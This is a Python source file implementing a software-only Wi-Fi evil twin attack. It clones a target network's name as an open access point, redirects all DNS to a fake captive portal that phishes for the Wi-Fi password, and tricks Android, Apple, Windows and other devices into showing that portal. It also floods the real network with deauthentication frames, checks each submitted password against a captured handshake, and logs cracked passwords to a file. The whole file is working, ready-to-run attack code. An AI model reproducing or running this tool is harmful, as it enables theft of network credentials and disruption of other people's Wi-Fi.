# evil_twin_software.py — Software-only Evil Twin (no ESP required)
# Uses hostapd + dnsmasq + Python HTTP server + scapy deauth
import os
import sys
import time
import signal
import shutil
import socket
import threading
import subprocess
import json
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from scapy.all import sendp, sniff, RadioTap, Dot11, Dot11Deauth
from wifi_nightmare.config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_RESET
from wifi_nightmare.utils import run_command, verify_password
from wifi_nightmare.logger import logger

PORTAL_AP_IP = "10.0.0.1"
PORTAL_AP_SUBNET = "255.255.255.0"
PORTAL_AP_DHCP_START = "10.0.0.10"
PORTAL_AP_DHCP_END = "10.0.0.50"
HOSTAPD_CONF = "/tmp/wifinightmare_hostapd.conf"
DNSMASQ_CONF = "/tmp/wifinightmare_dnsmasq.conf"
PORTAL_HTML_FILE = "/tmp/wifinightmare_portal.html"

# ── Captive Portal Detection URLs (by device type) ──────────────────────
# These are the URLs devices/OSes probe to detect captive portals.
# We must respond to ALL of them, each with content that does NOT match
# what the device expects for "connected", so the OS triggers the portal.

# Android / Google: sends GET to generate_204, expects 204 No Content + empty body
# Any non-204 response or non-empty body → portal detected.
ANDROID_URLS = frozenset({
    "/generate_204", "/gen_204", "/generate204", "/portal_204",
    "/chromeos-captive-portal", "/blank",
})

# Apple (iOS / macOS): sends GET to hotspot-detect.html, expects "Success" in body
# Anything without "Success" → portal detected.
# Sends random URIs via CaptiveNetworkSupport framework → catch-all handles.
APPLE_URLS = frozenset({
    "/hotspot-detect.html", "/library/test/success.html",
    "/success.txt", "/success.html", "/success",
})

# Windows NCSI: sends GET to ncsi.txt, expects "Microsoft NCSI"
# Sends GET to connecttest.txt, expects "Microsoft Connect Test"
# Anything else → portal detected.
WINDOWS_URLS = frozenset({
    "/ncsi.txt", "/connecttest.txt",
    "/fwlink", "/canonical.html", "/redirect",
})

# Samsung One UI / Android: sends GET to check_network_status.txt
# Samsung-specific path for captive portal detection.
SAMSUNG_URLS = frozenset({
    "/check_network_status.txt", "/network_status.html",
})

# Amazon Kindle: sends GET to kindle-wifi/wifistub.html
KINDLE_URLS = frozenset({
    "/kindle-wifi/wifistub.html",
})

# CAPPORT / RFC 8908: modern Android 12+ / Chrome use this API
# The well-known location returns JSON indicating captive portal status.
CAPPORT_URLS = frozenset({
    "/.well-known/captiveportal/check",
    "/.well-known/capport",
    "/.well-known/captiveportal",
})

# Firefox / Chrome: may check these for connectivity
BROWSER_URLS = frozenset({
    "/captiveportal/generate_204",
})

# Union of all known detection URLs for fast checking
ALL_DETECT_URLS = ANDROID_URLS | APPLE_URLS | WINDOWS_URLS | SAMSUNG_URLS | KINDLE_URLS | CAPPORT_URLS | BROWSER_URLS

# ── Auto-redirect HTML for generate_204 style endpoints ──
# This is served to any device that hits a generate_204 endpoint.
# It's NOT the main portal — it's a lightweight page that auto-redirects
# to the portal. This is critical because:
#   1. Samsung One UI breaks on 302 (HTTP redirect) → must serve 200 with HTML
#   2. Android CaptivePortalLogin activity loads this page in a WebView
#   3. The meta refresh + JS redirect together ensure the user sees the portal
REDIRECT_HTML = """<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="0;url=http://{ip}/">
<title>Redirecting...</title>
<script>window.location.replace("http://{ip}/");</script>
<style>body{margin:0;background:#f0f2f5;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;color:#65676b}</style>
</head><body><p>Loading...</p></body></html>"""

DEFAULT_PORTAL = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Wi-Fi Access</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,system-ui,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;padding:2rem;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center;width:90%;max-width:360px}
h2{color:#1a1a1a;margin:0 0 .5rem;font-size:1.5rem}
p{color:#65676b;font-size:.95rem;margin-bottom:1.5rem;line-height:1.5}
input{width:100%;padding:12px;margin-bottom:15px;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box;font-size:16px;outline:none}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{background:#166fe5}
.hidden{display:none!important}
.error{color:#d32f2f;background:#ffebee;padding:10px;border-radius:6px;margin-bottom:15px;font-size:.9rem;display:none}
.spinner{border:3px solid #f3f3f3;border-top:3px solid #1877f2;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.logo{font-size:3rem;color:#1877f2;margin-bottom:10px}
</style>
</head>
<body>
<div id="login-view" class="card">
  <div class="logo">&#128246;</div>
  <h2>Welcome</h2>
  <p>Enter the Wi-Fi password to access the internet.</p>
  <div id="error-msg" class="error">Incorrect password. Try again.</div>
  <input type="password" id="password" placeholder="Wi-Fi Password" autocomplete="off">
  <button onclick="sendData()">Connect</button>
</div>
<div id="wait-view" class="card hidden">
  <h2>Verifying...</h2>
  <div class="spinner"></div>
  <p>Please wait...</p>
</div>
<div id="success-view" class="card hidden">
  <div class="logo" style="color:#4caf50">&#10003;</div>
  <h2 style="color:#4caf50">Connected</h2>
  <p>You are now connected to the internet.</p>
</div>
<script>
var ci;
function sendData(){
  var p=document.getElementById("password").value.trim();
  if(!p)return;
  document.getElementById("error-msg").style.display="none";
  document.getElementById("login-view").classList.add("hidden");
  document.getElementById("wait-view").classList.remove("hidden");
  fetch("/submit",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},"body":"password="+encodeURIComponent(p)})
  .then(function(){if(ci)clearInterval(ci);ci=setInterval(checkStatus,1000)})
  .catch(function(){resetView("Connection error.")});
}
function checkStatus(){
  fetch("/status").then(function(r){return r.text()}).then(function(s){
    if(s==="OK"){clearInterval(ci);document.getElementById("wait-view").classList.add("hidden");document.getElementById("success-view").classList.remove("hidden")}
    else if(s==="NO"){clearInterval(ci);resetView("Incorrect password.")}
  }).catch(function(){});
}
function resetView(m){
  document.getElementById("wait-view").classList.add("hidden");
  document.getElementById("login-view").classList.remove("hidden");
  var e=document.getElementById("error-msg");e.innerText=m;e.style.display="block";
  document.getElementById("password").value="";
}
</script>
</body></html>"""


# ── Captive portal response content for OS-specific endpoints ──────────
# These strings are served to detection endpoints. Each device/OS checks
# for a specific expected response. Serving anything else forces the OS
# to show the captive portal login notification.

# Windows NCSI expects "Microsoft NCSI" at /ncsi.txt — serve something else
NCSI_RESPONSE = b"WiFi Nightmare Captive Portal"

# Windows Connect Test expects "Microsoft Connect Test" at /connecttest.txt
CONNECTTEST_RESPONSE = b"""<!DOCTYPE html>
<html><head><title>Network Access Required</title></head>
<body><h1>Wi-Fi Login Required</h1><p>Please sign in to access the network.</p>
<script>window.location.replace("http://""" + PORTAL_AP_IP.encode() + b"""/");</script>
<meta http-equiv="refresh" content="0;url=http://""" + PORTAL_AP_IP.encode() + b"""/"></body></html>"""

# Apple success response — Apple checks if body contains "Success"
# So we serve the portal HTML which doesn't contain "Success" = triggers detection
APPLE_SUCCESS_RESPONSE = b"This network requires authentication."

# CAPPORT/RFC 8908 JSON response — tells modern Android 12+ that portal is active
CAPPORT_JSON = json.dumps({
    "captive": True,
    "user-portal-url": f"http://{PORTAL_AP_IP}/",
    "venue-info-url": "",
    "captive-api": f"http://{PORTAL_AP_IP}/.well-known/captiveportal/check",
}).encode()


class PortalHTTPHandler(BaseHTTPRequestHandler):
    """HTTP handler for captive portal with multi-device support.

    Handles all known captive portal detection endpoints for:
    - Android (generate_204, gen_204, etc.)  — serves redirect HTML
    - Apple iOS/macOS (hotspot-detect.html)   — serves portal (no "Success")
    - Windows NCSI (ncsi.txt, connecttest.txt) — non-matching content
    - Samsung One UI (check_network_status.txt) — serves portal HTML
    - CAPPORT (RFC 8908) — JSON with captive: true + API endpoint
    - Kindle, Firefox, Chrome, and catch-all
    """
    verification_status = 0  # 0=idle, 1=waiting, 2=accepted, 3=rejected
    captured_password = None

    def log_message(self, format, *args):
        pass  # Suppress HTTP logs

    def _read_portal_html(self):
        try:
            with open(PORTAL_HTML_FILE, "rb") as f:
                return f.read()
        except Exception:
            return DEFAULT_PORTAL.encode()

    def _send_headers(self, status_code, content_type, body_len, extra_headers=None):
        """Send common response headers. Always includes CAPPORT/interim headers."""
        self.send_response(status_code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(body_len))
        self.send_header("Connection", "close")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("X-Captive-Portal-Status", "login")
        self.send_header("X-Captive-Portal", "yes")
        if extra_headers:
            for k, v in extra_headers.items():
                self.send_header(k, v)
        self.end_headers()

    def _send_portal(self):
        body = self._read_portal_html()
        self._send_headers(200, "text/html", len(body))
        self.wfile.write(body)

    def _send_redirect_page(self):
        """Send an auto-redirect HTML page (NOT a 302 redirect).
        Samsung One UI breaks on 302. We serve 200+HTML with meta refresh + JS redirect.
        The device's captive portal OS process loads this in a WebView which
        triggers the portal notification.
        """
        body = REDIRECT_HTML.format(ip=PORTAL_AP_IP).encode()
        self._send_headers(200, "text/html", len(body))
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.rstrip("/")

        # ── /status → password verification status ──
        if path == "/status":
            status_map = {0: "IDLE", 1: "WAIT", 2: "OK", 3: "NO"}
            body = status_map.get(self.verification_status, "IDLE").encode()
            self._send_headers(200, "text/plain", len(body))
            self.wfile.write(body)
            return

        # ── Android / Google generate_204 endpoints ──
        # Android CaptivePortalLogin opens this URL in a WebView.
        # Serving an auto-redirect page ensures the WebView navigates to
        # the portal page where the user enters credentials.
        if path in ANDROID_URLS:
            self._send_redirect_page()
            return

        # ── Windows NCSI ncsi.txt ──
        # Windows expects "Microsoft NCSI" at this URL.
        # We serve something else so Windows knows it's behind a captive portal.
        if path == "/ncsi.txt":
            self._send_headers(200, "text/plain", len(NCSI_RESPONSE))
            self.wfile.write(NCSI_RESPONSE)
            return

        # ── Windows Connect Test ──
        # Windows expects "Microsoft Connect Test" here.
        if path == "/connecttest.txt":
            self._send_headers(200, "text/html", len(CONNECTTEST_RESPONSE))
            self.wfile.write(CONNECTTEST_RESPONSE)
            return

        # ── Apple hotspot-detect.html & success endpoints ──
        # Apple checks if the response body CONTAINS "Success".
        # Our portal HTML does NOT contain "Success" → triggers Apple's portal UI.
        # For success.txt/success.html specifically, serve a non-matching response.
        if path in APPLE_URLS:
            if path in ("/success.txt", "/success.html", "/success", "/library/test/success.html"):
                # Apple checks these for "Success" — serve something else
                self._send_headers(200, "text/html", len(APPLE_SUCCESS_RESPONSE))
                self.wfile.write(APPLE_SUCCESS_RESPONSE)
            else:
                # hotspot-detect.html — serve portal (no "Success" in it)
                self._send_portal()
            return

        # ── Samsung One UI ──
        if path in SAMSUNG_URLS:
            self._send_portal()
            return

        # ── Kindle ──
        if path in KINDLE_URLS:
            self._send_portal()
            return

        # ── CAPPORT (RFC 8908) — Android 12+ / Chrome ──
        if path in CAPPORT_URLS:
            self._send_headers(200, "application/json", len(CAPPORT_JSON))
            self.wfile.write(CAPPORT_JSON)
            return

        # ── Browser detection endpoints ──
        if path in BROWSER_URLS:
            self._send_redirect_page()
            return

        # ── Windows / Microsoft fwlink, canonical, redirect ──
        if path in ("/fwlink", "/canonical.html", "/redirect"):
            self._send_redirect_page()
            return

        # ── Catch-all: serve portal HTML ──
        # iOS 8.4+ sends random URI paths via CaptiveNetworkSupport.
        # Any path not handled above → deliver the portal page.
        self._send_portal()

    def do_POST(self):
        if self.path.rstrip("/") == "/submit":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode("utf-8", errors="ignore")
            params = parse_qs(body)

            # Accept both "password" and "name" field names
            password = params.get("password", params.get("name", [""]))[0]

            if password:
                PortalHTTPHandler.captured_password = password
                PortalHTTPHandler.verification_status = 1
                self._send_headers(200, "text/plain", 8)
                self.wfile.write(b"received")
            else:
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()


class SoftwareEvilTwin:
    def __init__(self, interface, target_bssid, target_channel, target_ssid,
                 db_handler, portal_html=None):
        self.interface = interface
        self.target_bssid = target_bssid.lower()
        self.target_channel = target_channel
        self.target_ssid = target_ssid
        self.db = db_handler
        self.portal_html = portal_html or DEFAULT_PORTAL

        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.http_server = None
        self.http_thread = None
        self.deauth_thread = None
        self.monitor_thread = None
        self.status_thread = None

        self.stop_attack = False
        self.clients = set()
        self.deauth_sent = 0
        self.correct_password = None
        self._passwords_tried = []

        self.ap_interface = None
        self._mon_interface = None
        self.original_interface = interface

    def _write_configs(self):
        """Write hostapd and dnsmasq config files."""
        # Find a suitable channel width
        hostapd_conf = f"""interface={self.ap_interface}
driver=nl80211
ssid={self.target_ssid}
channel={self.target_channel}
hw_mode=g
wmm_enabled=0
auth_algs=1
wpa=0
"""
        with open(HOSTAPD_CONF, "w") as f:
            f.write(hostapd_conf)

        dnsmasq_conf = f"""interface={self.ap_interface}
bind-interfaces
dhcp-range={PORTAL_AP_DHCP_START},{PORTAL_AP_DHCP_END},12h
address=/#/{PORTAL_AP_IP}
no-resolv
no-poll
"""
        with open(DNSMASQ_CONF, "w") as f:
            f.write(dnsmasq_conf)

        with open(PORTAL_HTML_FILE, "w", encoding="utf-8") as f:
            f.write(self.portal_html)

    def _create_ap_interface(self):
        """Create AP + monitor interfaces following airgeddon's approach."""
        ap_name = f"{self.interface}_ap"
        mon_name = f"{self.interface}mon"

        self._mon_interface = None

        # Kill interfering processes
        run_command(["airmon-ng", "check", "kill"])
        time.sleep(1)

        # Remove leftover interfaces
        for old in [ap_name, mon_name, f"{self.interface}_mon"]:
            run_command(["iw", "dev", old, "del"])
        time.sleep(0.3)

        # Create monitor interface with airmon-ng
        subprocess.run(
            ["airmon-ng", "start", self.interface],
            capture_output=True, text=True, timeout=15
        )
        time.sleep(1)

        # Check what interfaces exist now
        iw_out = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
        existing_ifaces = []
        for line in iw_out.stdout.splitlines():
            if line.strip().startswith("Interface"):
                existing_ifaces.append(line.strip().split()[-1])

        # Find the monitor interface
        for iface in existing_ifaces:
            if iface != self.interface and (iface.endswith("mon") or iface.endswith("mon0")):
                self._mon_interface = iface
                break
        if not self._mon_interface and self.interface not in existing_ifaces:
            for iface in existing_ifaces:
                if iface != self.interface:
                    self._mon_interface = iface
                    break

        # Try to create AP interface
        orig_still_there = self.interface in existing_ifaces

        if orig_still_there:
            phy = self._get_phy_name()
            if phy:
                result = subprocess.run(
                    ["iw", "phy", phy, "interface", "add", ap_name, "type", "ap"],
                    capture_output=True, text=True, timeout=5
                )
                if result.returncode == 0:
                    self.ap_interface = ap_name
                    return True

            # Fall back to hostapd on original interface
            self.ap_interface = self.interface
            return True
        else:
            phy = self._get_phy_name()
            if phy:
                result = subprocess.run(
                    ["iw", "phy", phy, "interface", "add", self.interface, "type", "managed"],
                    capture_output=True, text=True, timeout=5
                )
                if result.returncode == 0:
                    run_command(["ip", "link", "set", self.interface, "up"])
                    time.sleep(0.5)
                    self.ap_interface = self.interface
                    return True

            if self._mon_interface:
                self.ap_interface = self._mon_interface
                return True

        return False

    def _get_phy_name(self):
        """Get the phy name for the interface."""
        # Method 1: from iw dev info
        try:
            result = subprocess.run(
                ["iw", "dev", self.interface, "info"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.splitlines():
                if "wiphy" in line.lower():
                    return line.strip().split()[-1]
        except Exception:
            pass

        # Method 2: from sysfs
        try:
            with open(f"/sys/class/net/{self.interface}/phy80211/name") as f:
                return f.read().strip()
        except Exception:
            pass

        # Method 3: from sysfs index
        try:
            with open(f"/sys/class/net/{self.interface}/phy80211/index") as f:
                return f"phy{f.read().strip()}"
        except Exception:
            pass

        return None

    def _setup_ap_interface(self):
        """Configure the AP interface IP and bring it up."""
        if not self.ap_interface:
            return False

        run_command(["ip", "addr", "flush", "dev", self.ap_interface])
        run_command(["ip", "addr", "add", f"{PORTAL_AP_IP}/24", "dev", self.ap_interface])
        run_command(["ip", "link", "set", self.ap_interface, "up"])
        time.sleep(0.5)
        return True

    def _start_hostapd(self):
        """Start hostapd daemon."""
        if not self.ap_interface:
            return False

        try:
            self.hostapd_proc = subprocess.Popen(
                ["hostapd", HOSTAPD_CONF],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(2)

            if self.hostapd_proc.poll() is not None:
                stderr = self.hostapd_proc.stderr.read().decode(errors="ignore")
                print(f"{C_RED}[!] hostapd failed: {stderr.strip()}{C_RESET}")
                logger.error(f"hostapd failed: {stderr}")
                return False

            print(f"{C_GREEN}[+] hostapd started on {self.ap_interface}{C_RESET}")
            logger.info("hostapd started")
            return True

        except FileNotFoundError:
            print(f"{C_RED}[!] hostapd not found. Install: apt-get install hostapd{C_RESET}")
            return False

    def _start_dnsmasq(self):
        """Start dnsmasq for DHCP + DNS."""
        if not self.ap_interface:
            return False

        # Kill any existing dnsmasq
        run_command(["killall", "dnsmasq"])
        time.sleep(0.5)

        try:
            self.dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(1)

            if self.dnsmasq_proc.poll() is not None:
                stderr = self.dnsmasq_proc.stderr.read().decode(errors="ignore")
                print(f"{C_RED}[!] dnsmasq failed: {stderr.strip()}{C_RESET}")
                logger.error(f"dnsmasq failed: {stderr}")
                return False

            print(f"{C_GREEN}[+] dnsmasq started (DHCP + DNS) port 53{C_RESET}")
            logger.info("dnsmasq started")
            return True

        except FileNotFoundError:
            print(f"{C_RED}[!] dnsmasq not found. Install: apt-get install dnsmasq{C_RESET}")
            return False

    def _start_http_server(self):
        """Start captive portal HTTP server with concurrent request handling."""
        try:
            # ThreadingHTTPServer handles multiple concurrent requests (devices
            # polling /status every second while loading the portal page).
            # Single-threaded HTTPServer would block on a slow client.
            self.http_server = ThreadingHTTPServer((PORTAL_AP_IP, 80), PortalHTTPHandler)
            self.http_server.timeout = 5.0  # prevent hanging on dead clients
            self.http_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
            self.http_thread.start()
            print(f"{C_GREEN}[+] Captive portal server started on {PORTAL_AP_IP}:80{C_RESET}")
            logger.info("HTTP portal server started")
            return True
        except Exception as e:
            print(f"{C_RED}[!] HTTP server error: {e}{C_RESET}")
            logger.error(f"HTTP server failed: {e}")
            return False

    def _sniffer_thread(self):
        """Sniff for clients on the target network."""
        if not self.interface:
            return

        def _sniff_cb(pkt):
            if pkt.haslayer(Dot11):
                addr1 = pkt.addr1.lower() if pkt.addr1 else ""
                addr2 = pkt.addr2.lower() if pkt.addr2 else ""
                client_mac = None
                if self.target_bssid == addr1 and addr2 != "ff:ff:ff:ff:ff:ff" and not addr2.startswith("33:33"):
                    client_mac = addr2
                elif self.target_bssid == addr2 and addr1 != "ff:ff:ff:ff:ff:ff" and not addr1.startswith("33:33"):
                    client_mac = addr1
                if client_mac and client_mac not in self.clients:
                    self.clients.add(client_mac)

        while not self.stop_attack:
            try:
                sniff(iface=self.interface, prn=_sniff_cb, timeout=1.0, store=0)
            except Exception:
                pass

    def _deauth_thread(self):
        """Deauth clients from the real network."""
        # Find available deauth tool
        deauth_tool = None
        for tool in ["mdk4", "mdk3", "aireplay-ng"]:
            if shutil.which(tool):
                deauth_tool = tool
                break

        while not self.stop_attack:
            try:
                if not self.interface:
                    time.sleep(1)
                    continue

                # Try scapy first (works on monitor mode interfaces)
                try:
                    pkt_bcast = RadioTap() / Dot11(
                        addr1="ff:ff:ff:ff:ff:ff",
                        addr2=self.target_bssid,
                        addr3=self.target_bssid
                    ) / Dot11Deauth(reason=7)
                    sendp(pkt_bcast, iface=self.interface, count=3, verbose=False)
                    self.deauth_sent += 3
                except Exception:
                    # scapy failed — try external tool on the same interface
                    if deauth_tool == "mdk4":
                        subprocess.run(
                            ["mdk4", self.interface, "d", "-B", self.target_bssid],
                            capture_output=True, timeout=2
                        )
                        self.deauth_sent += 1
                    elif deauth_tool == "aireplay-ng":
                        subprocess.run(
                            ["aireplay-ng", "--deauth", "3", "-a", self.target_bssid, self.interface],
                            capture_output=True, timeout=2
                        )
                        self.deauth_sent += 3
                    elif deauth_tool == "mdk3":
                        subprocess.run(
                            ["mdk3", self.interface, "d", "-B", self.target_bssid],
                            capture_output=True, timeout=2
                        )
                        self.deauth_sent += 1

                time.sleep(0.5)
            except Exception as e:
                logger.debug(f"Deauth error: {e}")
                time.sleep(1)

    def _status_display(self):
        """Show attack status: AP clients, passwords tried, deauth status."""
        last_time = time.time()
        while not self.stop_attack:
            now = time.time()
            if now - last_time >= 3.0:
                ap_clients = 0
                try:
                    out = subprocess.run(["hostapd_cli", "-i", self.ap_interface, "all_sta"],
                                         capture_output=True, text=True, timeout=2)
                    ap_clients = out.stdout.strip().count("\n")
                except Exception:
                    pass

                deauth_status = f"Deauth:{self.deauth_sent}"
                tried = len(self._passwords_tried)

                sys.stdout.write("\r\033[K")
                line = f"{C_GREEN}AP clients: {ap_clients}{C_RESET} | "
                line += f"{C_YELLOW}Tried: {tried}{C_RESET} | "
                line += f"{C_RED}{deauth_status}{C_RESET}"
                sys.stdout.write(line)
                sys.stdout.flush()
                last_time = now
            time.sleep(0.5)

    def _cleanup(self):
        """Kill all started processes and remove interfaces."""
        self.stop_attack = True

        # Stop HTTP server
        if self.http_server:
            try:
                self.http_server.shutdown()
            except Exception:
                pass

        # Kill hostapd
        if self.hostapd_proc and self.hostapd_proc.poll() is None:
            try:
                self.hostapd_proc.terminate()
                self.hostapd_proc.wait(timeout=3)
            except Exception:
                try:
                    self.hostapd_proc.kill()
                except Exception:
                    pass

        # Kill dnsmasq
        if self.dnsmasq_proc and self.dnsmasq_proc.poll() is None:
            try:
                self.dnsmasq_proc.terminate()
                self.dnsmasq_proc.wait(timeout=3)
            except Exception:
                try:
                    self.dnsmasq_proc.kill()
                except Exception:
                    pass

        # Remove AP interface (only if it's a virtual one we created)
        if self.ap_interface and self.ap_interface != self.original_interface:
            run_command(["iw", "dev", self.ap_interface, "del"])
        self.ap_interface = None
        self._mon_interface = None

        # Clean config files
        for f in [HOSTAPD_CONF, DNSMASQ_CONF, PORTAL_HTML_FILE]:
            if os.path.exists(f):
                try:
                    os.remove(f)
                except Exception:
                    pass

        # Join threads
        for t in [self.deauth_thread, self.http_thread, self.status_thread]:
            if t and t.is_alive():
                t.join(timeout=2)

        logger.info("Software Evil Twin cleaned up")

    def run(self):
        """Main attack loop."""
        # Check handshake
        info = self.db.get_info(self.target_bssid)
        has_handshake = (info and info.get('Handshake')
                         and info.get('HSFile')
                         and os.path.exists(info['HSFile']))

        if not has_handshake:
            print(f"{C_RED}[!] No handshake for {self.target_ssid}{C_RESET}")
            input("Press Enter...")
            return

        handshake_file = info['HSFile']

        # Create AP interface
        if not self._create_ap_interface():
            print(f"{C_RED}[!] Could not create AP interface{C_RESET}")
            input("Press Enter...")
            return

        try:
            self._write_configs()

            if not self._setup_ap_interface():
                return

            if not self._start_hostapd():
                return

            if not self._start_dnsmasq():
                return

            if not self._start_http_server():
                return

            # Set up deauth
            if self._mon_interface:
                # Separate monitor interface exists (e.g. wlan0mon)
                self.interface = self._mon_interface
                run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])
            elif self.ap_interface != self.original_interface:
                # AP is on a different interface, switch original to monitor
                run_command(["ip", "link", "set", self.original_interface, "down"])
                time.sleep(0.3)
                subprocess.run(
                    ["iw", "dev", self.original_interface, "set", "type", "monitor"],
                    capture_output=True, text=True, timeout=5
                )
                run_command(["ip", "link", "set", self.original_interface, "up"])
                time.sleep(1)
                self.interface = self.original_interface
                run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])
            else:
                # Same interface for AP and deauth — try to add a monitor iface from AP
                mon_name = f"{self.ap_interface}_mon"
                result = subprocess.run(
                    ["iw", "phy", self._get_phy_name() or "phy0", "interface", "add", mon_name, "type", "monitor"],
                    capture_output=True, text=True, timeout=5
                )
                if result.returncode == 0:
                    run_command(["ip", "link", "set", mon_name, "up"])
                    time.sleep(0.5)
                    self.interface = mon_name
                    run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])
                else:
                    # No VIF support — use the same interface for deauth
                    # Some drivers allow raw frames even in managed/AP mode
                    self.interface = self.ap_interface
                    run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])

            # Start threads
            self.deauth_thread = threading.Thread(target=self._deauth_thread, daemon=True)
            self.deauth_thread.start()

            monitor_t = threading.Thread(target=self._sniffer_thread, daemon=True)
            monitor_t.start()

            self.status_thread = threading.Thread(target=self._status_display, daemon=True)
            self.status_thread.start()

            print(f"\n{C_GREEN}[+] Evil Twin: {self.target_ssid} on ch{self.target_channel}{C_RESET}")
            print(f"    http://{PORTAL_AP_IP} | Ctrl+C to stop\n")

            # Step 11: Wait for password
            while not self.stop_attack:
                if PortalHTTPHandler.captured_password:
                    raw_pass = PortalHTTPHandler.captured_password.strip()
                    PortalHTTPHandler.captured_password = None

                    sys.stdout.write("\r\033[K")
                    self._passwords_tried.append(raw_pass)

                    if len(raw_pass) < 8:
                        print(f"{C_RED}[-] Too short: '{raw_pass}'{C_RESET}")
                        PortalHTTPHandler.verification_status = 3
                        time.sleep(2)
                        PortalHTTPHandler.verification_status = 0
                        continue

                    if len(raw_pass) > 63:
                        print(f"{C_RED}[-] Too long: '{raw_pass}'{C_RESET}")
                        PortalHTTPHandler.verification_status = 3
                        time.sleep(2)
                        PortalHTTPHandler.verification_status = 0
                        continue

                    if verify_password(handshake_file, self.target_bssid, self.target_ssid, raw_pass):
                        print(f"\n{C_GREEN}[+] PASSWORD: {raw_pass}{C_RESET}")
                        self.correct_password = raw_pass
                        PortalHTTPHandler.verification_status = 2

                        with open("cracked.txt", "a") as f:
                            ts = time.strftime("%Y-%m-%d %H:%M:%S")
                            f.write(f"[{ts}] SSID: {self.target_ssid} | BSSID: {self.target_bssid} | Password: {raw_pass}\n")

                        time.sleep(3)
                        break
                    else:
                        print(f"{C_RED}[-] Wrong: '{raw_pass}'{C_RESET}")
                        PortalHTTPHandler.verification_status = 3
                        time.sleep(2)
                        PortalHTTPHandler.verification_status = 0

                time.sleep(0.1)

        except KeyboardInterrupt:
            print(f"\n\n{C_YELLOW}[!] Attack stopped by user{C_RESET}")
        finally:
            self._cleanup()

            # Clean up monitor interface if separate
            if self._mon_interface:
                run_command(["iw", "dev", self._mon_interface, "del"])

            # Restore original interface to managed mode
            run_command(["ip", "link", "set", self.original_interface, "down"])
            run_command(["iw", "dev", self.original_interface, "set", "type", "managed"])
            run_command(["ip", "link", "set", self.original_interface, "up"])
            run_command(["systemctl", "start", "NetworkManager"])
            print(f"{C_GREEN}[+] Interface restored to managed mode{C_RESET}")

            # Summary
            print(f"\n{C_YELLOW}[*] Attack Summary:{C_RESET}")
            print(f"  Deauth packets sent : {self.deauth_sent}")
            print(f"  Clients discovered  : {len(self.clients)}")
            if self.correct_password:
                print(f"{C_GREEN}[+] Password: {self.correct_password}{C_RESET}")
            else:
                print(f"{C_RED}[-] No password found{C_RESET}")
